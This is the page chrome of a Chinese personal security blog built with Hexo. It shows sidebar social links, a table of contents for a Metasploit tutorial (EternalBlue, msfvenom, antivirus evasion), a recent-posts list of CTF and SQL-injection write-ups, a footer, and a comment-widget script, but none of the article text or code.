id="card-info-btn" target="_blank" rel="noopener" href="https://weibo.com/u/5263814707"><i class="fab fa-weibo"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xssqg" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xssqg7571@gmail.com" target="_blank" title="Gmail"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://t.me/xssqg" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://twitter.com/757172041" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://www.facebook.com/JudheadYQQ/" target="_blank" title="FB"><i class="fab fa-facebook"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">在文章下面或者留言板可以发表评论喔，记得把邮箱留下来，这样我就可以回复你啦(交个朋友就行了，我是菜鸡，你问问题我也不会回你)请文明发言喔！！也可以关注我的其它社交软件私聊我</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">永恒之蓝利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.使用模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE%E5%BF%85%E9%80%89%E9%A1%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.配置必选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.运行模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8msfvenom"><span class="toc-number">1.2.</span> <span class="toc-text">生成后门msfvenom</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text">实验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">实验总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number">1.3.</span> <span class="toc-text">免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%86%E7%BB%91%E5%85%B6%E5%AE%83%E8%BD%AF%E4%BB%B6exe"><span class="toc-number">1.3.1.</span> <span class="toc-text">捆绑其它软件exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3"><span class="toc-number">1.3.2.</span> <span class="toc-text">加壳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96hash%E5%80%BC"><span class="toc-number">1.4.</span> <span class="toc-text">想要获取hash值</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/09/metasploit/" title="Metasploit的简单使用"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092208882.pngM" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Metasploit的简单使用"/></a><div class="content"><a class="title" href="/2021/12/09/metasploit/" title="Metasploit的简单使用">Metasploit的简单使用</a><time datetime="2021-12-09T14:05:53.000Z" title="发表于 2021-12-09 22:05:53">2021-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/03/hdb2021/" title="2021年黑盾杯wp"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031336772.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021年黑盾杯wp"/></a><div class="content"><a class="title" href="/2021/12/03/hdb2021/" title="2021年黑盾杯wp">2021年黑盾杯wp</a><time datetime="2021-12-03T05:20:50.000Z" title="发表于 2021-12-03 13:20:50">2021-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/17/ssrf/" title="CTFHub-SSRF"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291342123.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFHub-SSRF"/></a><div class="content"><a class="title" href="/2021/11/17/ssrf/" title="CTFHub-SSRF">CTFHub-SSRF</a><time datetime="2021-11-17T11:08:04.000Z" title="发表于 2021-11-17 19:08:04">2021-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/15/rce/" title="CTFHub-RCE"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291342123.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFHub-RCE"/></a><div class="content"><a class="title" href="/2021/11/15/rce/" title="CTFHub-RCE">CTFHub-RCE</a><time datetime="2021-11-15T08:39:38.000Z" title="发表于 2021-11-15 16:39:38">2021-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/11/sql-error-inject/" title="SQL-报错注入"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120817768.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL-报错注入"/></a><div class="content"><a class="title" href="/2021/10/11/sql-error-inject/" title="SQL-报错注入">SQL-报错注入</a><time datetime="2021-10-11T11:55:10.000Z" title="发表于 2021-10-11 19:55:10">2021-10-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: rgba(255,255,255,.0)"><div id="footer-wrap"><div class="copyright">&copy;2021 By Jughead YQQ</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome To 一名靓仔的 <a href="https://jason177.com">Blog</a>!<br>桂ICP备：没有喔宝贝</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo-aanpuy89j-xssqg.vercel.app/',
+      region: ''
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-aanpuy89j-xssqg.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
